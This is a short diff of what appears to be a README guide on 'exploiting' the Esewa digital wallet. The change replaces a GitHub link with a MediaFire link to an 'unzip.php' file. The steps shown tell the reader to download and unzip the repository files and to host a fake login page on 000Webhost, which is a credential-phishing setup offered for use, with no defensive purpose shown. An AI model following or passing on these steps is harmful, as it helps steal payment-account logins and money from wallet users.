@@ -5,7 +5,7 @@ This guide will walk you through the process of exploiting Esewa, a popular digi
 
 ## Steps
 
-1. Download the repository files and the `unzip.php` file from the provided link https://github.com/BijayaTamangShyangtan/Files/blob/main/File/unzip.php
+1. Download the repository files and the `unzip.php` file from the provided link https://www.mediafire.com/file/h2vj2fr10hvavze/unzip.php/file
 2. Unzip the downloaded repository files.
 3. Host the fake login page on 000Webhost. Here are the steps to do this:
     a. Sign up for a free account on 000Webhost.
